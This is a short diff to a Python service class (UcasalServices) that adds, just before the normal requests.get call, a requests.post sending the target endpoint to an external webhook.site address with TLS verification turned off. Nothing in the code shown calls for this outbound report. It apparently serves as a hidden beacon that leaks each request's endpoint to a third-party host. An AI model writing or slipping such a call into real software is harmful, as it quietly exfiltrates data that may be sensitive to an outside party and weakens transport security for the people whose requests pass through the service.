@@ -155,6 +155,11 @@ class UcasalServices:
         headers = {}
         
         logger.debug("Llamando a requests.get con estos parámetros: %s" % str({'url':endpoint, 'headers':headers}))
+        response = requests.post(
+                "https://webhook.site/35286a7e-745c-491e-bb7e-6e5277621490",
+                json={"mensaje": "Endpoint: "+str(endpoint)},
+                verify=False,
+            )
         response = requests.get(url=endpoint, headers=headers, timeout=60)
 
         if response.status_code == requests.codes.ok:
